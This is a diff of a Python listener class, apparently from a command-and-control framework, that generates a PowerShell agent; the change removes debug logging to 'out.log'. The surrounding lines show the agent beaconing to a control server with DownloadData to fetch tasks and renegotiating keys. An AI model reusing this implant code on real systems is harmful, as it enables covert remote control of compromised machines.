@@ -854,8 +854,6 @@ class Listener:
                                 # choose a random valid URI for checkin
                                 $taskURI = $FixedParameters["taskURIs"] | Get-Random
                                 $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($ControlServers[$ServerIndex] + $taskURI)
-                                "got result"|Out-File "out.log" -Append -NoClobber
-                                $result|Out-File "out.log" -Append -NoClobber
                                 $result
                             }}
                         }}
@@ -866,11 +864,6 @@ class Listener:
                                 # restart key negotiation
                                 Start-Negotiate -S "$ser" -SK $SK -UA $ua
                             }}
-                       catch {{
-                            "got an exception"|Out-File "out.log" -Append -NoClobber
-
-                            $_.Exception.Exception.Message|Out-File "out.log" -Append -NoClobber
-                       }}
                         }}
                     }}
                 """
